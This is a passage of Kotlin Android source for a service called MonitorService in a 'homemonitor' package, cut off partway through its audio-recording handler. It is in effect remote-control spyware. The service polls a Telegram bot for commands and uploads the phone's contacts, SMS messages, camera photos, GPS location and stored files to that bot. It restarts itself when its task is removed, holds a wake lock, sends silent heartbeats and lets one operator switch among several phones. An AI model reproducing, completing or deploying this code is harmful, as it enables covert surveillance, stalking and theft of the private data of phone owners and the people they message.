package com.homemonitor

import android.Manifest
import android.app.PendingIntent
import android.content.ContentResolver
import android.content.ContentValues
import android.content.Intent
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.HandlerThread
import android.os.Looper
import android.os.PowerManager
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Telephony
import android.util.Log
import android.webkit.MimeTypeMap
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class MonitorService : LifecycleService() {

    companion object {
        private const val BOT_TOKEN = "YOUR-TELEGRAM-BOT-TOKEN"
        private const val CHAT_ID   = "YOUR-CHAT-ID"

        private const val TAG              = "MonitorService"
        private const val NOTIFICATION_ID  = 1001
        private const val POLL_INTERVAL_MS = 8_000L
        private const val MAX_CONTACTS     = 20

        // Heartbeat: every 5 minutes, silently register device as alive
        private const val HEARTBEAT_INTERVAL_MS = 5 * 60 * 1000L

        // Shared preferences keys
        private const val PREFS_NAME         = "monitor_prefs"
        private const val PREF_DEVICE_NAME   = "device_name"
        private const val PREF_DEVICE_NUMBER = "device_number"
        private const val PREF_ACTIVE_DEVICE = "active_device"  // which device number bot should respond to

        private val BASE_URL          = "https://api.telegram.org/bot$BOT_TOKEN"
        private val BASE_FILE_URL     = "https://api.telegram.org/file/bot$BOT_TOKEN"
        private val URL_GET_UPDATES   = "$BASE_URL/getUpdates"
        private val URL_SEND_MSG      = "$BASE_URL/sendMessage"
        private val URL_SEND_PHOTO    = "$BASE_URL/sendPhoto"
        private val URL_SEND_DOCUMENT = "$BASE_URL/sendDocument"
        private val URL_SEND_AUDIO    = "$BASE_URL/sendAudio"
        private val URL_GET_FILE      = "$BASE_URL/getFile"

        private const val MAX_FILES = 20

        // Heartbeat registry key format stored in Telegram via bot API
        // We store device registry in SharedPreferences only (local per device)
        // Active device selection is stored in bot's "pinned" state via a local pref
    }

    private data class FileEntry(
        val displayName: String,
        val uri:         Uri,
        val sizeBytes:   Long,
        val mimeType:    String
    )

    private val fileCache       = mutableMapOf<String, List<FileEntry>>()
    private val folderFileCache = mutableMapOf<String, List<File>>()

    // ── WakeLock ──
    private var wakeLock: PowerManager.WakeLock? = null

    private val httpClient = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(20, TimeUnit.SECONDS)
        .writeTimeout(20, TimeUnit.SECONDS)
        .build()

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var pollJob: Job? = null
    private var heartbeatJob: Job? = null

    @Volatile private var updateOffset: Long = 0L

    private val cameraExecutor = Executors.newSingleThreadExecutor()
    private val mainHandler    = Handler(Looper.getMainLooper())

    // ── Device identity (loaded from SharedPreferences) ──
    private lateinit var deviceName: String
    private var deviceNumber: Int = 1

    override fun onCreate() {
        super.onCreate()
        Log.i(TAG, "Service created")
        loadDeviceIdentity()
        acquireWakeLock()
        startForegroundWithNotification()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        Log.i(TAG, "Service started — device: [$deviceNumber] $deviceName")

        pollJob?.cancel()
        pollJob = serviceScope.launch { pollLoop() }

        heartbeatJob?.cancel()
        heartbeatJob = serviceScope.launch { heartbeatLoop() }

        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        Log.i(TAG, "Task removed — scheduling self-restart")
        val restartIntent = Intent(applicationContext, MonitorService::class.java)
        val pendingIntent = PendingIntent.getService(
            applicationContext, 1, restartIntent,
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarmManager = getSystemService(ALARM_SERVICE) as android.app.AlarmManager
        alarmManager.set(
            android.app.AlarmManager.ELAPSED_REALTIME,
            android.os.SystemClock.elapsedRealtime() + 1_000L,
            pendingIntent
        )
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.i(TAG, "Service destroyed")
        pollJob?.cancel()
        heartbeatJob?.cancel()
        serviceScope.cancel()
        cameraExecutor.shutdown()
        releaseWakeLock()
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  WAKE LOCK — keeps CPU alive even in Battery Saver mode
    // ══════════════════════════════════════════════════════════════════════════

    private fun acquireWakeLock() {
        try {
            val pm = getSystemService(POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "HomeMonitor::PollWakeLock"
            ).also { it.acquire(10 * 60 * 60 * 1000L) } // 10 hours max
            Log.i(TAG, "WakeLock acquired")
        } catch (e: Exception) {
            Log.e(TAG, "WakeLock acquire failed: ${e.message}")
        }
    }

    private fun releaseWakeLock() {
        try {
            if (wakeLock?.isHeld == true) wakeLock?.release()
            Log.i(TAG, "WakeLock released")
        } catch (e: Exception) {
            Log.e(TAG, "WakeLock release failed: ${e.message}")
        }
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  DEVICE IDENTITY
    // ══════════════════════════════════════════════════════════════════════════

    private fun loadDeviceIdentity() {
        val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
        // Default name: device model (e.g. "Redmi Note 10")
        val defaultName = "${Build.MANUFACTURER} ${Build.MODEL}".trim()
        deviceName   = prefs.getString(PREF_DEVICE_NAME, defaultName) ?: defaultName
        deviceNumber = prefs.getInt(PREF_DEVICE_NUMBER, 1)
    }

    private fun saveDeviceIdentity() {
        getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit()
            .putString(PREF_DEVICE_NAME, deviceName)
            .putInt(PREF_DEVICE_NUMBER, deviceNumber)
            .apply()
    }

    /** Returns true if this device should respond to the command */
    private fun isActiveDevice(): Boolean {
        val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
        val activeNum = prefs.getInt(PREF_ACTIVE_DEVICE, deviceNumber)
        return activeNum == deviceNumber
    }

    /** Prefix for all bot messages — shows which device is responding */
    private fun devicePrefix(): String = "📱 [*${deviceNumber}. $deviceName*]\n"

    // ══════════════════════════════════════════════════════════════════════════
    //  HEARTBEAT LOOP — silent ping every 5 min so /alldevice knows we're alive
    // ══════════════════════════════════════════════════════════════════════════

    private suspend fun heartbeatLoop() {
        while (serviceScope.isActive) {
            try {
                sendHeartbeat()
            } catch (e: Exception) {
                Log.e(TAG, "Heartbeat error: ${e.message}")
            }
            delay(HEARTBEAT_INTERVAL_MS)
        }
    }

    /** Sends a silent heartbeat message that is immediately deleted — or stores
     *  last-seen time in a pinned message the bot edits. We use a simple approach:
     *  send to a dedicated "heartbeat" format that handleUpdate() recognizes and ignores
     *  for display but we track via updateOffset to know device is alive.
     *  Actually we store last heartbeat time in SharedPreferences + send an
     *  invisible message with parse_mode disabled so it's detectable. */
    private fun sendHeartbeat() {
        val now = System.currentTimeMillis()
        // Store locally so /alldevice can show last-seen time
        getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit()
            .putLong("last_heartbeat_$deviceNumber", now)
            .apply()
        // Send a silent "heartbeat" ping to bot so other devices / the bot itself can track
        // We use a special prefix "__hb__" that handleUpdate ignores silently
        val json = JSONObject().apply {
            put("chat_id", CHAT_ID)
            put("text", "__hb__ $deviceNumber|$deviceName|$now")
            put("disable_notification", true)
        }
        try {
            val body = json.toString().toRequestBody("application/json".toMediaTypeOrNull())
            val req  = Request.Builder().url(URL_SEND_MSG).post(body).build()
            httpClient.newCall(req).execute().use { /* fire and forget */ }
        } catch (_: Exception) {}
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  TELEGRAM POLLING LOOP
    // ══════════════════════════════════════════════════════════════════════════

    private suspend fun pollLoop() {
        Log.i(TAG, "Poll loop started (interval = ${POLL_INTERVAL_MS}ms)")
        while (serviceScope.isActive) {
            try {
                val updates = fetchUpdates()
                updates.forEach { update -> handleUpdate(update) }
            } catch (e: Exception) {
                Log.e(TAG, "Poll error: ${e.message}")
            }
            delay(POLL_INTERVAL_MS)
        }
    }

    private fun fetchUpdates(): List<JSONObject> {
        val url     = "$URL_GET_UPDATES?offset=$updateOffset&limit=10&timeout=0"
        val request = Request.Builder().url(url).get().build()

        val responseBody = httpClient.newCall(request).execute().use { response ->
            if (!response.isSuccessful) return emptyList()
            response.body?.string() ?: return emptyList()
        }

        val json = JSONObject(responseBody)
        if (!json.optBoolean("ok", false)) return emptyList()

        val result  = json.getJSONArray("result")
        val updates = mutableListOf<JSONObject>()

        for (i in 0 until result.length()) {
            val update   = result.getJSONObject(i)
            updates.add(update)
            val updateId = update.getLong("update_id")
            if (updateId >= updateOffset) updateOffset = updateId + 1
        }
        return updates
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  COMMAND DISPATCHER
    // ══════════════════════════════════════════════════════════════════════════

    private fun handleUpdate(update: JSONObject) {
        val message = update.optJSONObject("message") ?: return
        val chatId  = message.optJSONObject("chat")?.optString("id") ?: CHAT_ID
        val rawText = message.optString("text", "").trim()

        // Silently ignore heartbeat messages from all devices
        if (rawText.startsWith("__hb__ ")) {
            parseAndStoreHeartbeat(rawText)
            return
        }

        val document = message.optJSONObject("document")
        val photoArr = message.optJSONArray("photo")
        when {
            document != null -> { handleIncomingDocument(chatId, document); return }
            photoArr != null && photoArr.length() > 0 -> {
                handleIncomingDocument(chatId, photoArr.getJSONObject(photoArr.length() - 1),
                    fallbackName = "photo_${System.currentTimeMillis()}.jpg")
                return
            }
        }

        val text = rawText.substringBefore("@").lowercase(Locale.getDefault())
        Log.i(TAG, "Received command: '$text' from chatId: $chatId")

        // ── Global commands (ALL devices respond) ──
        when {
            text == "/alldevice" -> { handleAllDevice(chatId); return }
            text.startsWith("/switchdevice ") -> { handleSwitchDevice(chatId, rawText.removePrefix("/switchdevice ").trim()); return }
        }

        // ── /setdevice command: this device updates its own name ──
        if (text.startsWith("/setdevice ")) {
            handleSetDevice(chatId, rawText.removePrefix("/setdevice ").trim())
            return
        }

        // ── All other commands: only active device responds ──
        if (!isActiveDevice()) return

        when {
            text == "/help" || text == "/start"    -> handleHelp(chatId)
            text == "/status" || text == "/alive"  -> handleStatus(chatId)
            text == "/contacts"                    -> handleContacts(chatId)
            text == "/camera"                      -> handleCamera(chatId, CameraSelector.DEFAULT_BACK_CAMERA)
            text == "/frontcam"                    -> handleCamera(chatId, CameraSelector.DEFAULT_FRONT_CAMERA)
            text == "/location"                    -> handleLocation(chatId)
            text == "/files"                       -> handleFiles(chatId, "")
            text.startsWith("/files ")             -> handleFiles(chatId, text.removePrefix("/files "))
            text == "/sms"                         -> handleSms(chatId, "")
            text.startsWith("/sms ")               -> handleSms(chatId, rawText.removePrefix("/sms ").trim())
            text == "/filemn"                      -> handleFileMn(chatId, "")
            text.startsWith("/filemn ")            -> handleFileMn(chatId, rawText.removePrefix("/filemn ").trim())
            text == "/zipfolder"                   -> sendMessage(chatId,
                "${devicePrefix()}ℹ️ *Usage:*\n`/zipfolder <folder>`\n`/zipfolder <folder> 1 3 7`",
                parseMode = "Markdown")
            text.startsWith("/zipfolder ") -> {
                val arg     = rawText.removePrefix("/zipfolder ").trim()
                val parts   = arg.split(" ")
                val numbers = parts.drop(1).mapNotNull { it.toIntOrNull() }
                if (numbers.isNotEmpty()) handleZipSelected(chatId, parts[0], numbers)
                else handleZipFolder(chatId, parts[0])
            }
            text.matches(Regex("/audio\\d+"))      -> handleAudio(chatId, text.removePrefix("/audio").toIntOrNull() ?: 10)
            text.startsWith("/audio ")             -> handleAudio(chatId, text.removePrefix("/audio ").trim().toIntOrNull() ?: 10)
            text == "/audio"                       -> sendMessage(chatId, "${devicePrefix()}ℹ️ Usage: /audio20 or /audio 30 (max 120s)")
            else -> {}
        }
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  MULTI-DEVICE MANAGEMENT
    // ══════════════════════════════════════════════════════════════════════════

    /** Parse heartbeat from another device and store its last-seen time */
    private fun parseAndStoreHeartbeat(raw: String) {
        try {
            // Format: __hb__ deviceNumber|deviceName|timestamp
            val payload = raw.removePrefix("__hb__ ")
            val parts   = payload.split("|")
            if (parts.size >= 3) {
                val num  = parts[0].toIntOrNull() ?: return
                val name = parts[1]
                val ts   = parts[2].toLongOrNull() ?: return
                getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit()
                    .putLong("last_heartbeat_$num", ts)
                    .putString("device_name_$num", name)
                    .apply()
            }
        } catch (_: Exception) {}
    }

    /** /alldevice — THIS device sends its own entry; all devices do the same */
    private fun handleAllDevice(chatId: String) {
        val prefs    = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
        val activeNum = prefs.getInt(PREF_ACTIVE_DEVICE, deviceNumber)
        val lastSeen  = prefs.getLong("last_heartbeat_$deviceNumber", 0L)
        val agoMs     = System.currentTimeMillis() - lastSeen
        val aliveStr  = if (agoMs < 6 * 60 * 1000L) "🟢 Online" else "🔴 Offline (${formatAgo(agoMs)})"
        val activeStr = if (activeNum == deviceNumber) " ← *ACTIVE*" else ""

        val msg = "📱 *Device $deviceNumber: $deviceName*$activeStr\n" +
                  "Status: $aliveStr\n" +
                  "Switch to this device: `/switchdevice $deviceNumber`"
        sendMessage(chatId, msg, parseMode = "Markdown")
    }

    /** /switchdevice <number> — set which device number should respond to commands */
    private fun handleSwitchDevice(chatId: String, arg: String) {
        val num = arg.trim().toIntOrNull()
        if (num == null) {
            sendMessage(chatId, "❌ Usage: /switchdevice <number>\nExample: /switchdevice 2")
            return
        }
        getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit()
            .putInt(PREF_ACTIVE_DEVICE, num)
            .apply()

        // Only the newly-activated device confirms (others stay silent)
        if (num == deviceNumber) {
            sendMessage(chatId,
                "✅ Switched! Now controlling:\n📱 *$deviceNumber. $deviceName*\n\nAll commands will go to this phone.",
                parseMode = "Markdown")
        }
    }

    /** /setdevice <name> — rename this device */
    private fun handleSetDevice(chatId: String, newName: String) {
        if (newName.isBlank()) {
            sendMessage(chatId, "❌ Usage: /setdevice <name>\nExample: /setdevice Dad's Phone")
            return
        }
        deviceName = newName.trim()
        saveDeviceIdentity()
        sendMessage(chatId,
            "✅ Device renamed!\n📱 *$deviceNumber. $deviceName*",
            parseMode = "Markdown")
    }

    private fun formatAgo(ms: Long): String {
        val sec = ms / 1000
        return when {
            sec < 60   -> "${sec}s ago"
            sec < 3600 -> "${sec / 60}m ago"
            else       -> "${sec / 3600}h ago"
        }
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  COMMANDS (with device prefix in every response)
    // ══════════════════════════════════════════════════════════════════════════

    private fun handleHelp(chatId: String) {
        val msg = """
            ${devicePrefix()}🤖 *MonitorService — Command List*

            ─────────────────────────
            📱 *Multi-Device*
            /alldevice — List all devices with status
            /switchdevice <n> — Switch active device (e.g. /switchdevice 2)
            /setdevice <name> — Rename this device

            ─────────────────────────
            📶 *Basic*
            /status or /alive — Check if phone is online
            
            ─────────────────────────
            📷 *Camera*
            /camera    — Rear camera photo
            /frontcam  — Front camera photo

            ─────────────────────────
            📍 *Location*
            /location — GPS coordinates + Maps link

            ─────────────────────────
            👥 *Contacts & SMS*
            /contacts        — First 20 contacts
            /sms             — Last 20 SMS
            /sms <number>    — SMS with specific number

            ─────────────────────────
            🎙️ *Audio*
            /audio20 — Record 20s audio (max 120s)

            ─────────────────────────
            📂 *Files*
            /files          — List recent files
            /files <number> — Send that file

            ─────────────────────────
            🗂 *File Manager*
            /filemn                   — All root folders
            /filemn <folder>          — Browse folder
            /filemn <folder> <number> — Send file

            ─────────────────────────
            🗜️ *ZIP*
            /zipfolder <folder>         — ZIP entire folder
            /zipfolder <folder> 1 3 5   — ZIP selected files

            ─────────────────────────
            📤 Send any file to chat → saved to Downloads
        """.trimIndent()
        sendMessage(chatId, msg, parseMode = "Markdown")
    }

    private fun handleStatus(chatId: String) {
        val timeStr = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
        sendMessage(chatId, "${devicePrefix()}✅ Phone Alive\n🕐 $timeStr", parseMode = "Markdown")
    }

    private fun handleContacts(chatId: String) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
            != PackageManager.PERMISSION_GRANTED) {
            sendMessage(chatId, "${devicePrefix()}⚠️ READ_CONTACTS permission not granted.")
            return
        }
        val contacts = readContacts()
        if (contacts.isEmpty()) { sendMessage(chatId, "${devicePrefix()}📭 No contacts found."); return }
        val sb = StringBuilder("${devicePrefix()}📒 *Contacts* (${contacts.size}):\n\n")
        contacts.forEachIndexed { i, (name, num) -> sb.append("${i+1}. *$name*\n   `$num`\n") }
        sendMessage(chatId, sb.toString(), parseMode = "Markdown")
    }

    private fun readContacts(): List<Pair<String, String>> {
        val contacts = mutableListOf<Pair<String, String>>()
        val cursor = contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER),
            null, null,
            "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC"
        ) ?: return contacts
        cursor.use {
            val nameCol   = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val numberCol = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
            while (it.moveToNext() && contacts.size < MAX_CONTACTS) {
                contacts.add(Pair(it.getString(nameCol) ?: "Unknown", it.getString(numberCol) ?: "N/A"))
            }
        }
        return contacts
    }

    private fun handleSms(chatId: String, filter: String) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
            != PackageManager.PERMISSION_GRANTED) {
            sendMessage(chatId, "${devicePrefix()}⚠️ READ_SMS permission not granted.")
            return
        }
        val messages = readSmsMessages(filter.trim())
        if (messages.isEmpty()) {
            sendMessage(chatId, "${devicePrefix()}📭 ${if (filter.isBlank()) "No SMS found." else "No messages for: $filter"}")
            return
        }
        val header = if (filter.isBlank()) "${devicePrefix()}💬 *Last SMS* (${messages.size}):\n\n"
                     else "${devicePrefix()}💬 *SMS with* `$filter` (${messages.size}):\n\n"
        val sb = StringBuilder(header)
        messages.forEach { msg ->
            val line = "${msg.dirEmoji} *${msg.address}*\n   🕐 ${msg.dateStr}\n   ${msg.body}\n\n"
            if (sb.length + line.length > 4_000) {
                sendMessage(chatId, sb.toString().trimEnd(), parseMode = "Markdown"); sb.clear()
            }
            sb.append(line)
        }
        if (sb.isNotBlank()) sendMessage(chatId, sb.toString().trimEnd(), parseMode = "Markdown")
    }

    private data class SmsEntry(val dirEmoji: String, val address: String, val dateStr: String, val body: String)

    private fun readSmsMessages(numberFilter: String, limit: Int = 20): List<SmsEntry> {
        val results = mutableListOf<SmsEntry>()
        val dateFmt = SimpleDateFormat("MM-dd HH:mm", Locale.getDefault())
        val (selection, selArgs) = if (numberFilter.isNotEmpty())
            Pair("address LIKE ?", arrayOf("%${numberFilter.takeLast(7)}%")) else Pair(null, null)
        val cursor = contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE, Telephony.Sms.TYPE),
            selection, selArgs, "${Telephony.Sms.DATE} DESC"
        ) ?: return results
        cursor.use { c ->
            val addrCol = c.getColumnIndex(Telephony.Sms.ADDRESS)
            val bodyCol = c.getColumnIndex(Telephony.Sms.BODY)
            val dateCol = c.getColumnIndex(Telephony.Sms.DATE)
            val typeCol = c.getColumnIndex(Telephony.Sms.TYPE)
            while (c.moveToNext() && results.size < limit) {
                val rawBody  = c.getString(bodyCol) ?: ""
                val body     = if (rawBody.length > 120) rawBody.take(120) + "…" else rawBody
                val safeBody = body.replace("_","\\_").replace("*","\\*").replace("`","\\`").replace("[","\\[")
                results.add(SmsEntry(
                    if (c.getInt(typeCol) == Telephony.Sms.MESSAGE_TYPE_SENT) "📤" else "📨",
                    c.getString(addrCol) ?: "Unknown",
                    dateFmt.format(Date(c.getLong(dateCol))),
                    safeBody
                ))
            }
        }
        return results
    }

    private fun handleCamera(chatId: String, cameraSelector: CameraSelector) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
            != PackageManager.PERMISSION_GRANTED) {
            sendMessage(chatId, "${devicePrefix()}⚠️ CAMERA permission not granted."); return
        }
        val label = if (cameraSelector == CameraSelector.DEFAULT_FRONT_CAMERA) "front" else "rear"
        sendMessage(chatId, "${devicePrefix()}📷 Taking photo ($label camera)…", parseMode = "Markdown")
        mainHandler.post {
            val providerFuture = ProcessCameraProvider.getInstance(this)
            providerFuture.addListener({
                var cameraProvider: ProcessCameraProvider? = null
                try {
                    cameraProvider = providerFuture.get()
                    val capture = ImageCapture.Builder()
                        .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY).build()
                    cameraProvider.unbindAll()
                    cameraProvider.bindToLifecycle(this, cameraSelector, capture)
                    val photoFile = File(cacheDir, "photo_${System.currentTimeMillis()}.jpg")
                    capture.takePicture(
                        ImageCapture.OutputFileOptions.Builder(photoFile).build(),
                        cameraExecutor,
                        object : ImageCapture.OnImageSavedCallback {
                            override fun onImageSaved(output: ImageCapture.OutputFileResults) {
                                mainHandler.post { try { cameraProvider?.unbindAll() } catch (_: Exception) {} }
                                sendPhoto(chatId, photoFile); photoFile.delete()
                            }
                            override fun onError(exc: ImageCaptureException) {
                                mainHandler.post { try { cameraProvider?.unbindAll() } catch (_: Exception) {} }
                                sendMessage(chatId, "${devicePrefix()}❌ Camera error: ${exc.message}")
                            }
                        })
                } catch (e: Exception) {
                    mainHandler.post { try { cameraProvider?.unbindAll() } catch (_: Exception) {} }
                    sendMessage(chatId, "${devicePrefix()}❌ Camera error: ${e.message}")
                }
            }, ContextCompat.getMainExecutor(this))
        }
    }

    private fun handleLocation(chatId: String) {
        val hasFine   = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)   == PackageManager.PERMISSION_GRANTED
        val hasCoarse = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
        if (!hasFine && !hasCoarse) { sendMessage(chatId, "${devicePrefix()}⚠️ Location permission not granted."); return }

        val locationManager = getSystemService(LOCATION_SERVICE) as LocationManager
        val lastKnown: Location? = try {
            val gps     = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            val network = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            when {
                gps != null && network != null -> if (gps.time >= network.time) gps else network
                gps != null -> gps
                else -> network
            }
        } catch (_: SecurityException) { null }

        val maxAgeMs = 3 * 60 * 1000L
        if (lastKnown != null && (System.currentTimeMillis() - lastKnown.time) <= maxAgeMs) {
            sendLocationReply(chatId, lastKnown, fresh = false); return
        }
        sendMessage(chatId, "${devicePrefix()}📡 Acquiring GPS fix…", parseMode = "Markdown")

        var responded = false
        val provider  = if (hasFine) LocationManager.GPS_PROVIDER else LocationManager.NETWORK_PROVIDER
        val listener  = object : LocationListener {
            override fun onLocationChanged(location: Location) {
                if (!responded) { responded = true; try { locationManager.removeUpdates(this) } catch (_: Exception) {}; sendLocationReply(chatId, location, fresh = true) }
            }
            @Deprecated("Deprecated in Java") override fun onStatusChanged(p: String?, s: Int, e: Bundle?) {}
            override fun onProviderEnabled(p: String) {}
            override fun onProviderDisabled(p: String) {
                if (!responded) { responded = true; try { locationManager.removeUpdates(this) } catch (_: Exception) {}; sendMessage(chatId, "${devicePrefix()}❌ Location provider disabled.") }
            }
        }
        try { locationManager.requestLocationUpdates(provider, 0L, 0f, listener, mainHandler.looper) }
        catch (e: SecurityException) { sendMessage(chatId, "${devicePrefix()}❌ Location permission revoked."); return }

        mainHandler.postDelayed({
            if (!responded) {
                responded = true; try { locationManager.removeUpdates(listener) } catch (_: Exception) {}
                if (lastKnown != null) sendLocationReply(chatId, lastKnown, fresh = false, staleWarning = true)
                else sendMessage(chatId, "${devicePrefix()}❌ Could not get location. Enable GPS.")
            }
        }, 20_000L)
    }

    private fun sendLocationReply(chatId: String, location: Location, fresh: Boolean, staleWarning: Boolean = false) {
        val lat = location.latitude; val lon = location.longitude
        val acc = if (location.hasAccuracy()) "±${location.accuracy.toInt()} m" else "unknown"
        val alt = if (location.hasAltitude()) "${location.altitude.toInt()} m" else "N/A"
        val ageSeconds = (System.currentTimeMillis() - location.time) / 1000
        val ageLabel   = when { ageSeconds < 60 -> "${ageSeconds}s ago"; ageSeconds < 3600 -> "${ageSeconds / 60}m ago"; else -> "${ageSeconds / 3600}h ago" }
        val header = when { staleWarning -> "⚠️ *Stale location*:"; fresh -> "📍 *Current Location*:"; else -> "📍 *Last Known* ($ageLabel):" }
        sendMessage(chatId,
            "${devicePrefix()}$header\n\n🌐 Lat: `$lat`\n🌐 Lon: `$lon`\n🎯 Accuracy: $acc\n⛰ Altitude: $alt\n🗺 [Open in Maps](https://maps.google.com/?q=$lat,$lon)",
            parseMode = "Markdown")
    }

    private fun handleFiles(chatId: String, args: String) {
        val trimmed = args.trim()
        if (trimmed.isEmpty()) listFiles(chatId)
        else {
            val num = trimmed.toIntOrNull()
            if (num != null) sendFileByNumber(chatId, num)
            else sendMessage(chatId, "${devicePrefix()}Usage:\n• /files — list\n• /files <number> — send file")
        }
    }

    private fun listFiles(chatId: String) {
        val entries = mutableListOf<FileEntry>()
        fun queryCollection(collectionUri: Uri, mimeDefault: String, slotLimit: Int = MAX_FILES) {
            if (entries.size >= MAX_FILES) return
            val canTake = minOf(slotLimit, MAX_FILES - entries.size)
            contentResolver.query(collectionUri,
                arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME,
                        MediaStore.MediaColumns.SIZE, MediaStore.MediaColumns.MIME_TYPE),
                "${MediaStore.MediaColumns.SIZE} > 0", null,
                "${MediaStore.MediaColumns.DATE_MODIFIED} DESC")?.use { cursor ->
                val idCol = cursor.getColumnIndex(MediaStore.MediaColumns._ID)
                val nameCol = cursor.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
                val sizeCol = cursor.getColumnIndex(MediaStore.MediaColumns.SIZE)
                val mimeCol = cursor.getColumnIndex(MediaStore.MediaColumns.MIME_TYPE)
                var taken = 0
                while (cursor.moveToNext() && taken < canTake) {
                    entries.add(FileEntry(cursor.getString(nameCol) ?: "unknown",
                        Uri.withAppendedPath(collectionUri, cursor.getLong(idCol).toString()),
                        cursor.getLong(sizeCol), cursor.getString(mimeCol) ?: mimeDefault)); taken++
                }
            }
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
            queryCollection(MediaStore.Downloads.EXTERNAL_CONTENT_URI, "application/octet-stream")
        if (entries.size < MAX_FILES) queryCollection(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "image/jpeg", 5)
        if (entries.size < MAX_FILES) queryCollection(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, "video/mp4", 5)
        if (entries.size < MAX_FILES) queryCollection(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, "audio/mpeg", 5)

        if (entries.isEmpty()) { sendMessage(chatId, "${devicePrefix()}📂 No files found."); return }
        fileCache[chatId] = entries
        val sb = StringBuilder("${devicePrefix()}📂 *Files* (${entries.size}):\n\n")
        entries.forEachIndexed { i, f ->
            sb.append("${i+1}. `${f.displayName}` — ${formatSize(f.sizeBytes)}\n")
        }
        sb.append("\nReply `/files <number>` to receive a file.")
        sendMessage(chatId, sb.toString(), parseMode = "Markdown")
    }

    private fun sendFileByNumber(chatId: String, number: Int) {
        val list = fileCache[chatId]
        if (list.isNullOrEmpty()) { sendMessage(chatId, "${devicePrefix()}⚠️ Send /files first."); return }
        val idx = number - 1
        if (idx < 0 || idx >= list.size) { sendMessage(chatId, "${devicePrefix()}❌ Choose 1–${list.size}."); return }
        val entry = list[idx]
        sendMessage(chatId, "${devicePrefix()}📤 Sending *${entry.displayName}*…", parseMode = "Markdown")
        try {
            val bytes = contentResolver.openInputStream(entry.uri)?.use { it.readBytes() }
                ?: run { sendMessage(chatId, "${devicePrefix()}❌ Cannot read file."); return }
            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("document", entry.displayName, bytes.toRequestBody(entry.mimeType.toMediaTypeOrNull()))
                .addFormDataPart("caption", "📎 ${entry.displayName}").build()
            httpClient.newCall(Request.Builder().url(URL_SEND_DOCUMENT).post(body).build()).execute().use { r ->
                if (!r.isSuccessful) sendMessage(chatId, "${devicePrefix()}❌ Upload failed: ${r.code}")
            }
        } catch (e: Exception) { sendMessage(chatId, "${devicePrefix()}❌ Error: ${e.message}") }
    }

    private fun handleAudio(chatId: String, seconds: Int) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
            != PackageManager.PERMISSION_GRANTED) {
